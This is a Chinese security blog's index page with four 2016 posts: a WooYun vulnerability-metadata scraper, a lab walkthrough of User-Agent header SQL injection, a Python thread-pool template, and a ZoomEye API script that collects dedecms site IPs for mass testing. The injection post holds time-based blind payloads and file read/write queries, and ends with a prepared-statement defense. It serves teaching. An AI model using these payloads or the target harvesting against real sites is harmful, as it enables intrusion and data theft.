<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <title>Anka9080&#39;s Note</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Python,渗透测试,安全研发">
<meta property="og:type" content="website">
<meta property="og:title" content="Anka9080's Note">
<meta property="og:url" content="http://www.evilclay.com/index.html">
<meta property="og:site_name" content="Anka9080's Note">
<meta property="og:description" content="Python,渗透测试,安全研发">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Anka9080's Note">
<meta name="twitter:description" content="Python,渗透测试,安全研发">
  
    <link rel="alternative" href="/atom.xml" title="Anka9080&#39;s Note" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="https://avatars2.githubusercontent.com/u/13638980?v=3&amp;s=460" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">Anka9080</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>Menu</li>
						<li>Tags</li>
						
						<li>Links</li>
						
						
						<li>Über</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/archives">所有文章</a></li>
				        
							<li><a href="http://xss.evilclay.com">XSS 平台</a></li>
				        
							<li><a href="/2048">Just 4 Fun</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/Evi1CLAY" title="github">github</a>
					        
								<a class="rss" target="_blank" href="http://www.cnblogs.com/anka9080" title="rss">rss</a>
					        
								<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/amzhoupeng" title="zhihu">zhihu</a>
					        
								<a class="mail" target="_blank" href="#" title="mail">mail</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/Cookie劫持/" style="font-size: 10px;">Cookie劫持</a> <a href="/tags/DirBuster/" style="font-size: 10px;">DirBuster</a> <a href="/tags/GitHub/" style="font-size: 10px;">GitHub</a> <a href="/tags/GoogleHacking/" style="font-size: 10px;">GoogleHacking</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/Kali/" style="font-size: 10px;">Kali</a> <a href="/tags/Nessus/" style="font-size: 10px;">Nessus</a> <a href="/tags/Nmap/" style="font-size: 10px;">Nmap</a> <a href="/tags/Python/" style="font-size: 20px;">Python</a> <a href="/tags/Python脚本/" style="font-size: 10px;">Python脚本</a> <a href="/tags/SQLMap/" style="font-size: 10px;">SQLMap</a> <a href="/tags/SQL注入/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/WIFI热点伪造/" style="font-size: 10px;">WIFI热点伪造</a> <a href="/tags/Wiki/" style="font-size: 10px;">Wiki</a> <a href="/tags/ZoomEye/" style="font-size: 10px;">ZoomEye</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/乌云爬虫/" style="font-size: 10px;">乌云爬虫</a> <a href="/tags/信息收集/" style="font-size: 13.33px;">信息收集</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/多线程/" style="font-size: 16.67px;">多线程</a> <a href="/tags/安全工具/" style="font-size: 20px;">安全工具</a> <a href="/tags/密码破解/" style="font-size: 10px;">密码破解</a> <a href="/tags/御剑/" style="font-size: 10px;">御剑</a> <a href="/tags/打印机漏洞/" style="font-size: 10px;">打印机漏洞</a> <a href="/tags/正则表达式/" style="font-size: 10px;">正则表达式</a> <a href="/tags/漏洞分析/" style="font-size: 13.33px;">漏洞分析</a> <a href="/tags/目录扫描/" style="font-size: 10px;">目录扫描</a> <a href="/tags/端口扫描/" style="font-size: 13.33px;">端口扫描</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://xss.evilclay.com">XSS 平台</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/anka9080">CnBlogs博客</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">该作者并木有留下任何痕迹，相信你，会找到他是谁的 :P</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">Anka9080</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
			
				<img lazy-src="https://avatars2.githubusercontent.com/u/13638980?v=3&amp;s=460" class="js-avatar">
			
			</div>
			<hgroup>
			  <h1 class="header-author">Anka9080</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/archives">所有文章</a></li>
		        
					<li><a href="http://xss.evilclay.com">XSS 平台</a></li>
		        
					<li><a href="/2048">Just 4 Fun</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/Evi1CLAY" title="github">github</a>
			        
						<a class="rss" target="_blank" href="http://www.cnblogs.com/anka9080" title="rss">rss</a>
			        
						<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/amzhoupeng" title="zhihu">zhihu</a>
			        
						<a class="mail" target="_blank" href="#" title="mail">mail</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>

      <div class="body-wrap">
  
    <article id="post-wooyun-spider" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/05/27/wooyun-spider/" class="article-date">
  	<time datetime="2016-05-27T10:24:16.000Z" itemprop="datePublished">2016-05-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/05/27/wooyun-spider/">爬取 WooYun 论坛所有漏洞条目的相关信息</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>每个漏洞条目包含：</strong></p>
<p>乌云ID，漏洞标题，漏洞所属厂商，白帽子，漏洞类型，厂商或平台给的Rank值</p>
<p><strong>主要是做数据分析使用：</strong><br>可以分析某厂商的各类型漏洞的统计；<br>或者对白帽子的能力进行分析…..</p>
<p>数据更新时间：2016/5/27<br>漏洞条目：104796条</p>
<p><strong>数据截图如下：</strong></p>
<p><img src="http://images2015.cnblogs.com/blog/671902/201605/671902-20160527002538147-1212236189.png" alt=""></p>
<p><strong>数据网盘链接：</strong></p>
<p>链接：<a href="http://pan.baidu.com/s/1bpDNKOv" target="_blank" rel="external">http://pan.baidu.com/s/1bpDNKOv</a> 密码：6y57</p>
<p><strong>爬虫脚本：</strong></p>
<pre><code># coding:utf-8
# author: anka9080
# version: 1.0  py3

import sys,re,time,socket
from requests import get
from queue import Queue, Empty
from threading import Thread

# 全局变量
COUNT = 1
START_URL = &apos;http://wooyun.org/bugs&apos;
ID_DETAILS = []
ALL_ID = []
Failed_ID = []
PROXIES = []

HEADERS = {
    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml,application/json;q=0.9,image/webp,*/*;q=0.8&quot;,
    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, sdch&quot;,
    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8&quot;,
    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,
    &quot;Connection&quot;: &quot;keep-alive&quot;,
    &quot;DNT&quot;: &quot;1&quot;,
    &quot;Host&quot;: &quot;wooyun.org&quot;,
    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2716.0 Safari/537.36&quot;
}

class WooYunSpider(Thread):
    &quot;&quot;&quot;docstring for WooYunSpider&quot;&quot;&quot;
    def __init__(self,queue):
        Thread.__init__(self)
        self.pattern1 = re.compile(r&apos;title&gt;(.*?)\| WooYun.*?keywords&quot; content=&quot;(.*?),(.*?),(.*?),wooyun&apos;,re.S)  # 匹配模式在 compile 的时候指定
        self.pattern2 = re.compile(r&quot;漏洞Rank：(\d{1,3})&quot;)
        self.queue = queue
        self.start() # 执行 run()

    def run(self):
        &quot;每次读取 queue 的一条&quot;
        global COUNT,RES_LOG,ERR_LOG
        while(1):
            try:
                id = self.queue.get(block = False)
                r = get(&apos;http://wooyun.org/bugs/&apos; + id,headers = HEADERS)
                html = r.text
            except Empty:
                break
            except Exception as e:
                msg = &apos;[ - Socket_Excpt ] 链接被拒绝，再次添加到队列：&apos; + id
                print(msg)
                ERR_LOG.write(msg+&apos;\n&apos;)
                self.queue.put(id)  # 访问失败则把这个 URL从新加入队列
            else:
                title,comp,author,bug_type,rank = self.get_detail(html,id)
                detail = id+&apos;----&apos;+title+&apos;----&apos;+comp+&apos;----&apos;+author+&apos;----&apos;+bug_type+&apos;----&apos;+rank
                try: # 写入文件可能会诱发 gbk 编码异常，这里保存 id 到 failed
                    RES_LOG.write(detail + &apos;\n&apos;)
                except Exception as e:
                    Failed_ID.append(id)
                    msg = &apos;[ - Encode_Excpt ] 字符编码异常：&apos; + id
                    print(msg)
                    ERR_LOG.write(msg+&apos;\n&apos;)
                ID_DETAILS.append(detail)
            # time.sleep(1)

            print(&apos;[ - info ] id: {}  count: {}  time: {:.2f}s&apos;.format(id,COUNT,time.time() - start))
            COUNT += 1

    # 由 缺陷编号 获得对应的 厂商 和 漏洞类型信息
    def get_detail(self,html,id):
        global ERR_LOG
        try:
            # print(html)
            res = self.pattern1.search(html)
            title = res.group(1).strip()
            comp = res.group(2).strip()
            author = res.group(3).strip()
            bug_type = res.group(4).strip()
        except Exception as e:
            msg = &apos;[ - Detail_Excpt ] 未解析出 标题等相关信息：&apos; + id
            print(msg)
            ERR_LOG.write(msg+&apos;\n&apos;)
            Failed_ID.append(id)
            title,comp,author,bug_type,rank = &apos;Null&apos;,&apos;Null&apos;,&apos;Null&apos;,&apos;Null&apos;,&apos;Null&apos;
        else:
            try:
                res2 = self.pattern2.search(html)  # 若厂商暂无回应则 rank 为 Null
                rank = res2.group(1).strip()
            except Exception as e:
                msg = &apos;[ - Rank_Excpt ] 未解析出 Rank：&apos; + id
                print(msg)
                ERR_LOG.write(msg+&apos;\n&apos;)
                rank = &apos;Null&apos;

        finally:
            try:
                print (title,comp,author,bug_type,rank)
            except Exception as e:
                msg = &apos;[ - Print_Excpt ] 字符编码异常：&apos; + id +&apos;::&apos;+ str(e)
                print(msg)
                ERR_LOG.write(msg+&apos;\n&apos;)
            return title,comp,author,bug_type,rank




class ThreadPool(object):
    def __init__(self,thread_num,id_file):
        self.queue = Queue() # 需要执行的队列
        self.threads = [] # 多线程列表
        self.add_task(id_file)
        self.init_threads(thread_num)


    def add_task(self,id_file):
        with open(id_file) as input:
            for id in input.readlines():
                self.queue.put(id.strip())         

    def init_threads(self,thread_num):
        for i in range(thread_num):
            print (&apos;[ - info :] loading threading ---&gt; &apos;,i)
            # time.sleep(1)
            self.threads.append(WooYunSpider(self.queue)) # threads 列表装的是 爬虫线程

    def wait(self):
        for t in self.threads:
            if t.isAlive():
                t.join()


def test():
    url = &apos;http://wooyun.org/bugs/wooyun-2016-0177647&apos;
    r = get(url,headers = HEADERS)
    html = r.text
    # print type(html)
    # keywords&quot; content=&quot;(.*?),(.*?),(.*?),wooyun  ====&gt; 厂商，白帽子，类型
    pattern1 = re.compile(r&apos;title&gt;(.*?)\| WooYun&apos;)
    pattern2 = re.compile(r&apos;keywords&quot; content=&quot;(.*?),(.*?),(.*?),wooyun&apos;)
    pattern3 = re.compile(r&apos;漏洞Rank：(\d{1,3})&apos;)
    for x in range(500):
        res = pattern1.search(html)
        # print (res.group(1))
        res = pattern2.search(html)
        # print (res.group(1),res.group(2),res.group(3))
        res = pattern3.search(html)
        # print (res.group(1))
        x += 1
        print(x)
    # rank = res.group(4).strip()

    # print html

def test2():
    url = &apos;http://wooyun.org/bugs/wooyun-2016-0177647&apos;
    r = get(url,headers = HEADERS)
    html = r.text
    pattern = re.compile(r&apos;title&gt;(.*?)\| WooYun.*?keywords&quot; content=&quot;(.*?),(.*?),(.*?),wooyun.*?漏洞Rank：(\d{1,3})&apos;,re.S)
    for x in range(500):
        res = pattern.search(html)
        # print (res.group(1),res.group(2),res.group(3),res.group(4),res.group(5))
        x += 1
        print(x)
# 保存结果
def save2file(filename,filename_failed_id):
    with open(filename,&apos;w&apos;) as output:
        for item in ID_DETAILS:
            try: # 写入文件可能会诱发 gbk 编码异常，这里忽略
                output.write(item + &apos;\n&apos;)
            except Exception as e:
                pass

    with open(filename_failed_id,&apos;w&apos;) as output:
        output.write(&apos;\n&apos;.join(Failed_ID))

if __name__ == &apos;__main__&apos;:

    socket.setdefaulttimeout(1)
    start = time.time()

    # test()

    # 日志记录
    ERR_LOG = open(&apos;err_log.txt&apos;,&apos;w&apos;)
    RES_LOG = open(&apos;res_log.txt&apos;,&apos;w&apos;)
    id_file = &apos;id_0526.txt&apos;
    # id_file = &apos;id_test.txt&apos;
    tp = ThreadPool(20,id_file)
    tp.wait()

    save2file(&apos;id_details.txt&apos;,&apos;failed_id.txt&apos;)

    end = time.time()
    print (&apos;[ - info ] cost time :{:.2f}s&apos;.format(end - start))
</code></pre>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/乌云爬虫/">乌云爬虫</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/多线程/">多线程</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/正则表达式/">正则表达式</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
    <article id="post-ua-sql-injection" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/05/26/ua-sql-injection/" class="article-date">
  	<time datetime="2016-05-26T10:15:23.000Z" itemprop="datePublished">2016-05-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/05/26/ua-sql-injection/">User-Agent 手工注入的探测与利用分析</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>原理很简单：后台在接收UA时没有对UA做过滤，也没有PDO进行数据交互（实际PDO是非常有必要的），导致UA中有恶意代码，最终在数据库中执行。 </p>
<h3 id="0x00-Bug-代码："><a href="#0x00-Bug-代码：" class="headerlink" title="0x00 Bug 代码："></a>0x00 Bug 代码：</h3><p>本地顺手打了一个环境，Bug 代码部分：</p>
<pre><code>// 保存到访者的IP信息
$db=DBConnect();
$tbLog=$db-&gt;tbPrefix.&apos;log&apos;; $executeArr=array(&apos;ip&apos;=&gt;($_SERVER[&quot;HTTP_VIA&quot;])?$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]:$_SERVER[&quot;REMOTE_ADDR&quot;],&apos;ua&apos;=&gt;$_SERVER[&apos;HTTP_USER_AGENT&apos;],&apos;visit_time&apos;=&gt;date(&apos;Y-m-d H:i:s&apos;));
$db-&gt;AutoExecute($tbLog,$executeArr);
$smarty=InitSmarty();
$smarty-&gt;assign(&apos;do&apos;,$do);
$smarty-&gt;assign(&apos;show&apos;,$show);
$smarty-&gt;assign(&apos;url&apos;,$url);
$smarty-&gt;display(&apos;login.html&apos;);
</code></pre><p>　其中 AutoExecute() 方法 代码如下：</p>
<pre><code>public function AutoExecute($table,$array=array(),$type=&apos;INSERT&apos;,$where=&apos;&apos;){
    if(!empty($array) &amp;&amp; !empty($table)){
        switch(strtoupper($type)){
            case &apos;INSERT&apos;:
                $sql=&quot;INSERT INTO {$table}(&quot;.implode(&apos;,&apos;,array_keys($array)).&quot;) VALUES(&apos;&quot;.implode(&quot;&apos;,&apos;&quot;,array_values($array)).&quot;&apos;)&quot;;
                echo $sql;
                break;
            default:break;
        }
        return $this-&gt;Execute($sql);
    }
    else{
        return false;
    }
}
</code></pre><p>可以看出 ip，ua 这个变量未经过任何过滤 以 SQL 拼接的方式插入到数据库中。</p>
<h3 id="0x01-SQLMap-初探"><a href="#0x01-SQLMap-初探" class="headerlink" title="0x01 SQLMap 初探"></a>0x01 SQLMap 初探</h3><p>因为是 HTTP Header 注入，所以决定简单粗暴的使用 -r 参数测试有无注入。</p>
<p>用burp 代理截包保存成 req.txt ,内容如下：</p>
<pre><code>GET /index.php?do=login HTTP/1.1

Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: csrftoken=zfPpDQbDhjPJ7Xbh8z3aMqAxhVv8vvCs
Connection: keep-alive
</code></pre><p>使用 sqlmap.py -r req.txt –level 3 没跑出来，姿势不对？？？ 决定用自己的双手实现自己的梦想啦~~</p>
<h3 id="0x02-手动注入测试"><a href="#0x02-手动注入测试" class="headerlink" title="0x02 手动注入测试"></a>0x02 手动注入测试</h3><p>使用burp 的repeater 模块，修改User-Agent：</p>
<pre><code>GET /index.php?do=login HTTP/1.1

Host: localhost
User-Agent: Anka9080&apos;,(select(sleep(5))))#
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: csrftoken=zfPpDQbDhjPJ7Xbh8z3aMqAxhVv8vvCs
Connection: keep-alive
</code></pre><p>结果真会发现等待了5s才收到网站的返回信息，延时注入测试成功~~</p>
<p>该请求发送后，实际执行的SQL语句 如下：</p>
<pre><code>INSERT INTO log(ip,ua,visit_time) VALUES(&apos;127.0.0.1&apos;,&apos;Anka9080&apos;,(select(sleep(5))))#&apos;,&apos;2016-05-26 20:15:41&apos;)
</code></pre><p>进一步分析这条SQL语句：</p>
<p>Select(sleep(5))  返回的是 0 ，在外层加上一对括号，相当于单引号(‘’)，还有一个右括号) 用来闭合 VALUES 的 左括号，类似于字符型插入，后面的 # 是注释符，会把原本的时间等数据给注释掉，保证了这是一条可执行的SQL语句。</p>
<h3 id="0x03-猜数据，读文件"><a href="#0x03-猜数据，读文件" class="headerlink" title="0x03 猜数据，读文件"></a>0x03 猜数据，读文件</h3><p>预先在数据库中创建了表 user(user,pass) 存在一个条目 admin,admin666</p>
<p>通过sleep判断基于时间的延时注射，下面手工构造用户名并根据相应时间来判断是否存在这个用户（在 UA 位置执行整条SQL 来判断）：</p>
<p>把 UA 的值改成如下：</p>
<pre><code>User-Agent: Anka9080&apos;,(select sleep(5) from user where substring(user,1,1)=&apos;a&apos;))#
</code></pre><p>执行的SQL是：</p>
<pre><code>INSERT INTO log(ip,ua,visit_time) VALUES(&apos;127.0.0.1&apos;,&apos;Anka9080&apos;,(select sleep(5) from user where substring(user,1,1)=&apos;a&apos;))#&apos;,&apos;2016-05-26 21:04:49&apos;)
</code></pre><p>若user 表 中存在以a 开头的数据，则会延迟5秒返回页面，</p>
<p>当然一般要先对用户表user 做 fuzzing， 这个把 where 条件去掉就可以了。</p>
<p>同理 使用 substring(user,1,n) 来判断第n个字符是什么，继而得到了完整的字段的值。</p>
<p>已经能读出数据了，尝试下读写文件，理论上有权限就可以。 </p>
<p>把user 表的内容读出来并写入到服务器文件中：</p>
<pre><code>INSERT INTO log(ip,ua,dt) VALUES(&apos;127.0.0.1&apos;,&apos;Anka9080&apos;,(select * from user into outfile &apos;盘/绝对路径/1.txt&apos;))#&apos;,&apos;2016-05-26 21:30:04&apos;
</code></pre><p>不知为何没有执行成功 在 SQL 查询器里单独执行 </p>
<pre><code>select * from user into outfile &apos;盘/绝对路径/1.txt&apos;
</code></pre><p>是可以的…</p>
<p>如果注入点是有输出的位置，则</p>
<p>利用Id = 1 union select 1, loadfile(‘盘/绝对路径/1.txt’) from message 来读取文件内容到页面显示</p>
<p>此外，其他 HTTP Header 的注入与 User-Agent 的注入是一样道理的。</p>
<h3 id="0x04-SQL注入防御"><a href="#0x04-SQL注入防御" class="headerlink" title="0x04 SQL注入防御"></a>0x04 SQL注入防御</h3><p>至于防御SQL注入，预编译吧，简单可靠，不需要做任何的过滤，做到了“数据和代码的分离</p>
<pre><code>&lt;?php

$link = new mysqli(&apos;localhost&apos;, &apos;analytics_user&apos;, &apos;aSecurePassword&apos;, &apos;analytics_db&apos;);

$stmt = $link-&gt;prepare(&quot;INSERT INTO visits (ua, dt) VALUES (?, ?)&quot;);
$stmt-&gt;bind_param(&quot;ss&quot;, $_SERVER[&quot;HTTP_USER_AGENT&quot;], date(&quot;Y-m-d h:i:s&quot;));
$stmt-&gt;execute();

?&gt;
</code></pre><blockquote>
<p>参考文章：<a href="http://www.freebuf.com/articles/web/105124.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/105124.html</a></p>
</blockquote>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
    <article id="post-python-multithreads-templete" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/05/24/python-multithreads-templete/" class="article-date">
  	<time datetime="2016-05-24T10:11:29.000Z" itemprop="datePublished">2016-05-24</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/05/24/python-multithreads-templete/">Python ThreadPool 线程池模板</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="0x-00-Why"><a href="#0x-00-Why" class="headerlink" title="0x 00 Why"></a>0x 00 Why</h2><p>　　Python 的 简单多线程实现 用 dummy 模块 一句话就可以搞定，但需要对线程，队列做进一步的操作，最好自己写个线程池类来实现，考虑到后期会经常使用，所以把模板贴出来。</p>
<h2 id="0x-01-Coding"><a href="#0x-01-Coding" class="headerlink" title="0x 01 Coding"></a>0x 01 Coding</h2><pre><code># coding:utf-8
# version: 0.1
import re,time
from requests import get
from Queue import Queue, Empty
from threading import Thread

# 全局变量
COUNT = 0

# 爬虫类
class Spider(Thread):
    &quot;&quot;&quot;docstring for Spider&quot;&quot;&quot;
    def __init__(self,queue):
        Thread.__init__(self)
        self.queue = queue
        self.start() # 执行 run()

    def run(self):
        &quot;每次读取 queue 的一条&quot;
        global COUNT
        while(1):
            try:
                sth = self.queue.get(block=false)
            except Empty:
                break
            except Exception,e:
                print &apos;[- Excpt :]&apos;,str(e)

        print COUNT
        COUNT += 1


# 线程池类
class ThreadPool(object):
    def __init__(self):
        self.queue = Queue() # 需要执行的队列
        self.threads = [] # 多线程列秒
        pass

    def add_task(self):
        pass

    def init_threads(self):
        pass

    def wait(self):
        for t in self.threads:
            if t.isAlive():
                t.join()



if __name__ == &apos;__main__&apos;:
    start = time.time()

    tp = ThreadPool(thread_num)
    tp.wait()

    end = time.time()

    print &apos;[ - info ] cost time :{}&apos;.format(end - start)
</code></pre>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/多线程/">多线程</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
    <article id="post-zoomeye-api" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/30/zoomeye-api/" class="article-date">
  	<time datetime="2016-03-30T10:03:39.000Z" itemprop="datePublished">2016-03-30</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/30/zoomeye-api/">Python 调用 ZoomEye API 批量获取目标网站IP</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160330161710441-1284229011.png" alt=""></p>
<h2 id="0x-00-前言"><a href="#0x-00-前言" class="headerlink" title="0x 00 前言"></a>0x 00 前言</h2><p>　　ZoomEye 的 API 在前几天正式对外部开发，这对网络渗透人员来说是一件开心的事</p>
<p>　　可以说“妈妈再也不用担心批量测(x)试(zhan)没有资源了。”</p>
<p>　　官方的 API 帮助文档在下面：</p>
<p>　　<a href="https://www.zoomeye.org/api/" target="_blank" rel="external">https://www.zoomeye.org/api/</a></p>
<p>　　看了下，使用方法是先提交账户，密码获得一个唯一的访问令牌（access_token）</p>
<p>　　然后每次调用 API 的时候在 HTTP 的 Headers 里加上格式化后的 access_token 就可以使用了</p>
<p>　　官方文档为了方便使用给出的是 cURL 方式调用 API ，在这里我给出一个用 Python 调用 API 的 Demo</p>
<h2 id="0x-01-Code"><a href="#0x-01-Code" class="headerlink" title="0x 01 Code"></a>0x 01 Code</h2><p>　　该 Demo 抓取 ZoomEye 上 搜索 dedecms 的所有结果并把前 100 个IP保存到 文件中.</p>
<pre><code># coding: utf-8
# author  : anka9080
# datetime: 20160330

import os
import requests
import json

access_token = &apos;&apos;
ip_list = []

def login():
    &quot;&quot;&quot;
        输入用户米密码 进行登录操作
    :return: 访问口令 access_token
    &quot;&quot;&quot;
    user = raw_input(&apos;[-] input : username :&apos;)
    passwd = raw_input(&apos;[-] input : password :&apos;)
    data = {
        &apos;username&apos; : user,
        &apos;password&apos; : passwd
    }
    data_encoded = json.dumps(data)  # dumps 将 python 对象转换成 json 字符串
    try:
        r = requests.post(url = &apos;http://api.zoomeye.org/user/login&apos;,data = data_encoded)
        r_decoded = json.loads(r.text) # loads() 将 json 字符串转换成 python 对象
        global access_token
        access_token = r_decoded[&apos;access_token&apos;]
    except Exception,e:
        print &apos;[-] info : username or password is wrong, please try again &apos;
        exit()

def saveStrToFile(file,str):
    &quot;&quot;&quot;
        将字符串写如文件中
    :return:
    &quot;&quot;&quot;
    with open(file,&apos;w&apos;) as output:
        output.write(str)

def saveListToFile(file,list):
    &quot;&quot;&quot;
        将列表逐行写如文件中
    :return:
    &quot;&quot;&quot;
    s = &apos;\n&apos;.join(list)
    with open(file,&apos;w&apos;) as output:
        output.write(s)

def apiTest():
    &quot;&quot;&quot;
        进行 api 使用测试
    :return:
    &quot;&quot;&quot;
    page = 1
    global access_token
    with open(&apos;access_token.txt&apos;,&apos;r&apos;) as input:
        access_token = input.read()
    # 将 token 格式化并添加到 HTTP Header 中
    headers = {
        &apos;Authorization&apos; : &apos;JWT &apos; + access_token,
    }
    # print headers
    while(True):
        try:

            r = requests.get(url = &apos;http://api.zoomeye.org/host/search?query=&quot;dedecms&quot;&amp;facet=app,os&amp;page=&apos; + str(page),
                         headers = headers)
            r_decoded = json.loads(r.text)
            # print r_decoded
            # print r_decoded[&apos;total&apos;]
            for x in r_decoded[&apos;matches&apos;]:
                print x[&apos;ip&apos;]
                ip_list.append(x[&apos;ip&apos;])
            print &apos;[-] info : count &apos; + str(page * 10)

        except Exception,e:
            # 若搜索请求超过 API 允许的最大条目限制 或者 全部搜索结束，则终止请求
            if str(e.message) == &apos;matches&apos;:
                print &apos;[-] info : account was break, excceeding the max limitations&apos;
                break
            else:
                print  &apos;[-] info : &apos; + str(e.message)
        else:
            if page == 10:
                break
            page += 1

def main():
    # 访问口令文件不存在则进行登录操作
    if not os.path.isfile(&apos;access_token.txt&apos;):
        print &apos;[-] info : access_token file is not exist, please login&apos;
        login()
        saveStrToFile(&apos;access_token.txt&apos;,access_token)

    apiTest()
    saveListToFile(&apos;ip_list.txt&apos;,ip_list)

if __name__ == &apos;__main__&apos;:
    main()
</code></pre><h2 id="0x03-运行测试"><a href="#0x03-运行测试" class="headerlink" title="0x03 运行测试"></a>0x03 运行测试</h2><p><img src="http://images2015.cnblogs.com/blog/671902/201603/671902-20160330160700113-1074709220.png" alt=""></p>
<p>打开 access_token.txt 文件：</p>
